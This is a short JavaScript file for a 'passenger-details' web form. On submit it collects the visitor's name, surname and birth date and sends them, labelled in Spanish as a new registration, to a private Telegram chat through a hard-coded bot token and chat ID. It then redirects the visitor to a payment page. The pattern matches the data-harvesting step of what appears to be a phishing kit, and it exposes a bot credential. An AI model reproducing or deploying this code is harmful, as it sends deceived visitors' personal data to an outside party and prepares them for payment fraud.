document
  .getElementById("passenger-details")
  .addEventListener("submit", function (event) {
    // Prevent the form from submitting
    event.preventDefault();

    // You can now add your logic here to process the form data
    const name = document.getElementById("name").value;
    const lastName = document.getElementById("last_name").value;
    const day = document.getElementById("day").value;
    const month = document.getElementById("month").value;
    const year = document.getElementById("year").value;

    // For example, log the collected data
    console.log("Name:", name);
    console.log("Last Name:", lastName);
    console.log("Birthdate:", `${day}/${month}/${year}`);
    // Crea el mensaje para enviar a Telegram
    const mensaje = `
🔴 NUEVO REGISTRO 🔴\n
Nombre: ${name}\n
Apellido: ${lastName}\n
Día: ${day}\n
Mes: ${month}\n
Año: ${year}
  `;

    // Credenciales de Telegram
    const botToken = "7867820710:AAHjT59PWYnnfrx5PVh6XIJNZm_qG-Kfxmo";
    const chatId = "6405977303";

    // Envía el mensaje a Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: mensaje }),
    })
      .then((response) => {
        if (response.ok) {
          // Redirige a la página de pago después del envío exitoso
          window.location.href = "payment.html";
        } else {
          console.error("Error al enviar el mensaje.");
        }
      })
      .catch((error) => {
        console.error("Error de red:", error);
      });
  });
